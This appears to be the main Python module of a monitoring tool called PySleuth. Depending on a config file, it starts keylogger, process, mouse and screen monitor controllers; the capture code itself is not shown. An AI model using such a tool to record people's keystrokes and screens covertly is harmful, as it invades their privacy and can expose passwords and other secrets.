from .configuration import ConfigHandler, loadConfig
from .controllers import KeyLoggerController
from .controllers import ProcessMntrController
from .controllers import MouseMntrController
from .controllers import ScreenMntrController


class PySleuth:
    def __init__(self):
        self._controllers = set()

        self._initComponents()

    def start(self):
        for controller in self._controllers:
            controller.startWorker()

    def mainLoop(self):
        try:
            while True:
                pass
        except KeyboardInterrupt:
            print("\nUser abort!")

    def _initComponents(self):
        components = ConfigHandler().getCfgRun()

        if components.getboolean("keylogger"):
            self._initKeylogger()

        if components.getboolean("process-monitor"):
            self._initProcessMonitor()

        if components.getboolean("mouse-monitor"):
            self._initMouseMonitor()

        if components.getboolean("screen-monitor"):
            self._initScreenMonitor()

    def _initKeylogger(self):
        self._controllers.add(KeyLoggerController())

    def _initProcessMonitor(self):
        self._controllers.add(ProcessMntrController())

    def _initMouseMonitor(self):
        self._controllers.add(MouseMntrController())

    def _initScreenMonitor(self):
        self._controllers.add(ScreenMntrController())
